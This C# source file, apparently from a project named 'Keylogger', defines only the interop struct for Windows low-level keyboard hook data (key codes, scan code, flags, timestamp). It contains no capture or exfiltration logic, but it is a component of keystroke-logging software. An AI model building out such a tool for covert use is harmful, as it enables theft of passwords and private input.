using System;
using System.Runtime.InteropServices;

namespace Keylogger
{
    [StructLayout(LayoutKind.Sequential)]
    public class KbdLowLevelHookStruct
    {
        public uint vkCode;
        public uint scanCode;
        public KbdLowLevelHookStructFlags flags;
        public uint time;
        public UIntPtr dwExtraInfo;
    }
}
